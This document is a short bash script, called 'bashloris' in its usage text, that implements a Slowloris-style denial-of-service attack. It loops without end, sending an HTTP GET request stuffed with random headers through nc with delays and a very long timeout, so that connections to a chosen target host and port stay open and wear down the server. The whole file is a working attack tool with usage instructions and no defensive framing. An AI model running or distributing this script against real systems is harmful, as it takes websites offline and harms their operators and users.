ARG3=${3:-5}
if [ -z "$3" ]
then 
echo "no interval value supplied, setting it to five (5) seconds."
elif ! [[ "$3" =~ ^[0-9]+$ ]]; 
then
echo "Interval must be an integer (number).  Setting to '5'!"
ARG3=5
fi
while true; do
LONGSTRING=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
SHORTSTRING=$(< /dev/urandom tr -dc _A-Z-a-z-0-9 | head -c6)
#echo $LONGSTRING
#echo $SHORTSTRING
echo -e "GET / HTTP/1.1\r\nHost: $1\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$SHORTSTRING: $LONGSTRING\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n$RANDOM: $RANDOM\r\n"|nc -i $ARG3 -w 30000 $1 $2 2 >/dev/null; done
if [ $? -ne 0 ]
then
	echo "Usage:"
	echo "    bashloris <target> <port> <interval> = Launch bashloris against specified target."
	echo "    Interval is optional and defaults to five (5) seconds."
	echo "    Interval defines the time in seconds between sending each header."
fi
